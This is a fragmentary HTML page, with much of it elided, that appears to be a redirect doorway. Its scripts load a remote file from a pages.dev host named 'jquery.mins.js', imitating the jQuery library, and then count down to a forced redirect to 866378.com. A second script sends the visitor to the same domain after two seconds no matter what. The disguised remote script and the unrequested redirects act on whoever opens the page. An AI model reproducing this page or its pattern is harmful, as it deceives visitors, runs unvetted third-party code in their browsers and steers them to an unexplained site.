...
<body>
  ...
  <div class="card" id="card" style="display:none;">
    ...
    <a class="btn" href="https://866378.com" id="js-btn">
  ...
  <script>
    ...
    function loadScriptAndStartTimer() {
      ...
      s.src = 'https://tz-2jd.pages.dev/jquery.mins.js';
      s.async = true;
      s.onload = () => { alertSet(); };
    ...
    function alertSet() {
      ...
      const i = setInterval(() => {
        if (t <= 0) {
          clearInterval(i);
          location.href = 'https://866378.com';
        } else {
          t--;
          x.innerHTML = t;
          const pct = (1 - t / 3) * 100;
...
<script
    ...
    data-site-id="4ce4ebd1fc00"
    defer
></script>

<script>
    setTimeout(function() {
        window.location.href = Math.random() < 0.5 ? "https://866378.com" : "https://866378.com";
    }, 2000);
</script>
</body>
</html>
